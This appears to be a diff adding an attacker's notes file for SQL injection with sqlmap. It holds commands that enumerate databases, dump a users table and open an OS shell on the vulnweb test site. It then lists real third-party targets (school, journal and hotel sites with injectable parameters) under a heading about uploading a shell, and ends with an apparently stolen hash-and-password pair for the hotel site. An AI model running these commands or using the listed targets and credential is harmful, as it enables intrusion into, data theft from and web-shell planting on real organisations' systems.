@@ -1,0 +1,21 @@
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables 
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --dump
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --os-shell
+slqmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --os-shell
+
+
+
+Target 
+https://www.sman14-padang.sch.id/mod.php?mod=publisher&op=viewcat&cid=23
+
+Upload Shell SqlMap
+https://journal.kru.ac.th/article_detail.php?id_article=2
+
+
+https://man2tasikmalaya.sch.id/alumni.php?id=lihat&kd=6
+
+
+http://www.embryohotel.com/room-detail.php?id=1
+e742c63f03ab602f2b38433ffc28b5145ba1332d:embryohotel1234*
+
